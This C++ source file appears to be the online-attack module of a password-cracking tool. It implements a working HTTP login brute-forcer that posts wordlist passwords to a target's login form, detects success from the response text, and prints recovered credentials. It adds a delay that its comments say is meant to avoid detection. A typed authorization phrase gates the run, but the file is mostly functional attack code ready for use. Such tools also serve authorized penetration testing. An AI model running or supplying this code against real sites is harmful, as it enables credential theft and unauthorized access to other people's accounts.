#include <iostream>
#include <fstream>
#include <string>
#include <chrono>
#include <thread>
#include <sstream>
#include "online_attacks.hpp"

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <unistd.h>
    #define closesocket close
#endif

using namespace std;
using namespace std::chrono;

void printWarning() {
    cout << "\n" << string(80, '=') << "\n";
    cout << "WARNING: ONLINE ATTACK MODE - LEGAL AUTHORIZATION REQUIRED\n";
    cout << string(80, '=') << "\n";
    cout << "You MUST have explicit written permission to test the target system.\n";
    cout << "Unauthorized access attempts are ILLEGAL and may result in prosecution.\n";
    cout << "This tool is for:\n";
    cout << "  - Authorized penetration testing\n";
    cout << "  - Your own systems in controlled environments\n";
    cout << "  - CTF competitions and security research\n";
    cout << string(80, '=') << "\n\n";
    cout << "Type 'I HAVE AUTHORIZATION' to continue: ";

    string response;
    getline(cin, response);

    if (response != "I HAVE AUTHORIZATION") {
        cout << "\n[!] Authorization not confirmed. Exiting.\n";
        exit(1);
    }

    cout << "\n[+] Proceeding with authorized testing...\n\n";
}

bool initializeSockets() {
#ifdef _WIN32
    WSADATA wsaData;
    return WSAStartup(MAKEWORD(2, 2), &wsaData) == 0;
#else
    return true;
#endif
}

void cleanupSockets() {
#ifdef _WIN32
    WSACleanup();
#endif
}

string parseHost(const string& url) {
    size_t start = url.find("://");
    if (start == string::npos) start = 0;
    else start += 3;

    size_t end = url.find('/', start);
    if (end == string::npos) end = url.length();

    return url.substr(start, end - start);
}

string parsePath(const string& url) {
    size_t start = url.find("://");
    if (start == string::npos) start = 0;
    else start += 3;

    size_t pathStart = url.find('/', start);
    if (pathStart == string::npos) return "/";

    return url.substr(pathStart);
}

bool testHTTPLogin(const string& host, int port, const string& path,
                   const string& username, const string& password,
                   const string& usernameField, const string& passwordField) {

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return false;

    struct sockaddr_in server;
    struct hostent* he = gethostbyname(host.c_str());

    if (he == NULL) {
        closesocket(sock);
        return false;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr = *((struct in_addr*)he->h_addr);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        closesocket(sock);
        return false;
    }

    stringstream postData;
    postData << usernameField << "=" << username << "&"
             << passwordField << "=" << password;

    string postStr = postData.str();

    stringstream request;
    request << "POST " << path << " HTTP/1.1\r\n";
    request << "Host: " << host << "\r\n";
    request << "Content-Type: application/x-www-form-urlencoded\r\n";
    request << "Content-Length: " << postStr.length() << "\r\n";
    request << "Connection: close\r\n";
    request << "\r\n";
    request << postStr;

    string reqStr = request.str();
    send(sock, reqStr.c_str(), reqStr.length(), 0);

    char buffer[4096] = {0};
    int bytesRead = recv(sock, buffer, sizeof(buffer) - 1, 0);

    closesocket(sock);

    if (bytesRead > 0) {
        string response(buffer);

        // Check for success indicators (customize based on application)
        if (response.find("200 OK") != string::npos &&
            (response.find("success") != string::npos ||
             response.find("dashboard") != string::npos ||
             response.find("welcome") != string::npos)) {
            return true;
        }

        // Check for failure indicators
        if (response.find("401") != string::npos ||
            response.find("403") != string::npos ||
            response.find("invalid") != string::npos ||
            response.find("failed") != string::npos) {
            return false;
        }
    }

    return false;
}

void runHTTPBruteForce(const string& url, const string& username,
                       const string& wordlist, const string& usernameField,
                       const string& passwordField, int delayMs) {

    printWarning();

    if (!initializeSockets()) {
        cerr << "[!] Failed to initialize sockets\n";
        return;
    }

    ifstream dictFile(wordlist);
    if (!dictFile.is_open()) {
        cerr << "[!] Failed to open wordlist: " << wordlist << endl;
        cleanupSockets();
        return;
    }

    string host = parseHost(url);
    string path = parsePath(url);
    int port = 80;

    if (url.find("https://") != string::npos) {
        port = 443;
        cout << "[!] HTTPS not fully supported in this basic implementation\n";
        cout << "[!] Consider using tools like Hydra or Burp Suite for HTTPS\n";
    }

    cout << "\n[+] Starting HTTP Login Brute Force\n";
    cout << "[+] Target: " << host << ":" << port << path << "\n";
    cout << "[+] Username: " << username << "\n";
    cout << "[+] Delay: " << delayMs << "ms (rate limiting enabled)\n";
    cout << "[+] This will take some time to avoid detection...\n\n";

    long long attempts = 0;
    bool found = false;
    string password;

    auto start = high_resolution_clock::now();

    while (getline(dictFile, password) && !found) {
        attempts++;

        cout << "[" << attempts << "] Testing: " << username << " : " << password << "...";
        cout.flush();

        if (testHTTPLogin(host, port, path, username, password,
                         usernameField, passwordField)) {
            found = true;
            cout << " SUCCESS!\n";
            cout << "\n[!] Valid credentials found!\n";
            cout << "[!] Username: " << username << "\n";
            cout << "[!] Password: " << password << "\n";
            cout << "[!] Attempts: " << attempts << "\n";
        } else {
            cout << " Failed\n";
        }

        // Rate limiting to avoid detection and DoS
        this_thread::sleep_for(milliseconds(delayMs));
    }

    dictFile.close();

    auto end = high_resolution_clock::now();
    auto duration = duration_cast<seconds>(end - start);

    if (!found) {
        cout << "\n[!] No valid credentials found\n";
    }

    cout << "[!] Total attempts: " << attempts << "\n";
    cout << "[!] Time taken: " << duration.count() << " seconds\n";

    cleanupSockets();
}
